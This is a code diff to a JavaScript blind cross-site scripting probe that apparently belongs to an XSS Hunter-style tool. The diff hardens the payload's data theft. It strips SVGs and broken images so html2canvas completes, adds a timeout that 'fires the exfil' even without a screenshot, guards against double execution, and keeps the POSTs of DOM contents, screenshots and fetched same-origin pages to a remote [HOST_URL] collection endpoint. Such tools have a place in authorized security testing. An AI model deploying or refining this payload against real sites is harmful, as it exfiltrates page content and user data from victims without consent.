@@ -71,6 +71,9 @@ function never_null( value ) {
 }
 
 function collect_pages() {
+    if (!collect_page_list || collect_page_list.length === 0) {
+        return;
+    }
     for( var i = 0; i < collect_page_list.length; i++ ) {
         // Make sure the path is correctly formatted
         if( collect_page_list[i].charAt(0) != "/" ) {
@@ -152,6 +155,51 @@ function strip_event_handlers_from_dom() {
 					}
 				} catch(e) {}
 			}
+		}
+		// 5. Remove src from broken images (naturalWidth===0 && complete means
+		//    the image failed to load). html2canvas retries these internally and
+		//    can stall indefinitely waiting for a load/error callback that never fires.
+		var imgs = document.querySelectorAll('img[src]');
+		for (var i = 0; i < imgs.length; i++) {
+			try {
+				if (imgs[i].complete && imgs[i].naturalWidth === 0) {
+					imgs[i].removeAttribute('src');
+					imgs[i].removeAttribute('srcset');
+				}
+			} catch(e) {}
+		}
+		// 6. Remove <svg> elements — the bundled html2canvas (0.5.x) requires a
+		//    separate html2canvas.svg.js plugin for SVG rendering that is not
+		//    included. Without this, any page containing SVGs causes html2canvas
+		//    to reject its promise entirely, producing no screenshot at all.
+		var svgs = document.querySelectorAll('svg');
+		for (var i = svgs.length - 1; i >= 0; i--) {
+			try { svgs[i].parentNode.removeChild(svgs[i]); } catch(e) {}
+		}
+		// 7. Remove <img> elements whose src points to an SVG file or data URI.
+		//    html2canvas 0.5.x also fails on <img src="*.svg"> for the same reason —
+		//    it tries to render the SVG inline and throws if svg.js is not loaded.
+		var all_imgs = document.querySelectorAll('img[src]');
+		for (var i = 0; i < all_imgs.length; i++) {
+			try {
+				var src = all_imgs[i].getAttribute('src') || '';
+				if (/\.svg(\?|#|$)/i.test(src) || /^data:image\/svg\+xml/i.test(src)) {
+					all_imgs[i].removeAttribute('src');
+					all_imgs[i].removeAttribute('srcset');
+				}
+			} catch(e) {}
+		}
+		// 8. Strip CSS background-images that reference SVGs.
+		//    html2canvas draws background-images onto the canvas; SVG backgrounds
+		//    taint the canvas and make canvas.toDataURL() throw SecurityError.
+		var all_els = document.querySelectorAll('*');
+		for (var i = 0; i < all_els.length; i++) {
+			try {
+				var bg = window.getComputedStyle(all_els[i]).backgroundImage;
+				if (bg && bg !== 'none' && /\.svg/i.test(bg)) {
+					all_els[i].style.backgroundImage = 'none';
+				}
+			} catch(e) {}
 		}
 	} catch(e) {}
 }
@@ -257,6 +305,9 @@ function contact_mothership(probe_return_data) {
 	var payload_keys = Object.keys(probe_return_data);
 	payload_keys.map(function(payload_key) {
 		if(payload_key === 'screenshot') {
+			if (!probe_return_data[payload_key]) {
+				return;
+			}
 			var base64_data = probe_return_data[payload_key].replace(
 				'data:image/png;base64,',
 				''
@@ -279,8 +330,7 @@ function contact_mothership(probe_return_data) {
     var url = "[HOST_URL]/js_callback";
     http.open("POST", url, true);
     http.onreadystatechange = function() {
-        if(http.readyState == 4 && http.status == 200) {
-
+        if(http.readyState == 4) {
         }
     }
     http.send(form_data);
@@ -297,8 +347,7 @@ function send_collected_page( page_data ) {
     var url = "[HOST_URL]/page_callback";
     http.open("POST", url, true);
     http.onreadystatechange = function() {
-        if(http.readyState == 4 && http.status == 200) {
-
+        if(http.readyState == 4) {
         }
     }
     http.send(form_data);
@@ -306,7 +355,7 @@ function send_collected_page( page_data ) {
 
 function collect_page_data( path ) {
     try {
-        var full_url = location.protocol + "//" + document.domain + path
+        var full_url = location.protocol + "//" + location.host + path;
         var xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
             if (xhr.readyState == XMLHttpRequest.DONE) {
@@ -388,6 +437,23 @@ try {
 }
 
 async function hook_load_if_not_ready() {
+    // Global guard — window is shared even across multiple script executions.
+    // Prevents double-fire when onerror re-triggers or the script is injected twice.
+    if (window.__xssh_fired) { return; }
+    window.__xssh_fired = true;
+    var _finishing_called = false;
+    function safe_finish() {
+        if (_finishing_called) { return; }
+        _finishing_called = true;
+        finishing_moves();
+    }
+    // Safety net: if html2canvas hangs (e.g. broken images stall rendering),
+    // fire the exfil after 10s without a screenshot rather than lose all data.
+    var _safety_timer = setTimeout(function() {
+        probe_return_data['screenshot'] = '';
+        safe_finish();
+    }, 10000);
+
     try {
         // Capture raw DOM first (preserves original markup for forensics).
         var raw_dom = '';
@@ -413,16 +479,23 @@ async function hook_load_if_not_ready() {
 
         // Strip all code-execution vectors AFTER capturing the DOM so the stored
         // copy has the original markup, but html2canvas gets a sanitised clone.
-        // This covers: on* handlers, <script> tags, srcdoc iframes, javascript: URLs.
+        // This covers: on* handlers, <script> tags, srcdoc iframes, javascript: URLs,
+        // SVG images and CSS SVG backgrounds (which taint the canvas → SecurityError).
         strip_event_handlers_from_dom();
 
-        html2canvas(document.body).then(function(canvas) {
-            probe_return_data['screenshot'] = canvas.toDataURL();
-            finishing_moves();
+        html2canvas(document.body, { svgRendering: false, logging: false }).then(function(canvas) {
+            clearTimeout(_safety_timer);
+            try { probe_return_data['screenshot'] = canvas.toDataURL(); } catch(e) { probe_return_data['screenshot'] = ''; }
+            safe_finish();
+        }).catch(function() {
+            clearTimeout(_safety_timer);
+            probe_return_data['screenshot'] = '';
+            safe_finish();
         });
     } catch( e ) {
+        clearTimeout(_safety_timer);
         probe_return_data['screenshot'] = '';
-        finishing_moves();
+        safe_finish();
     }
 }
 
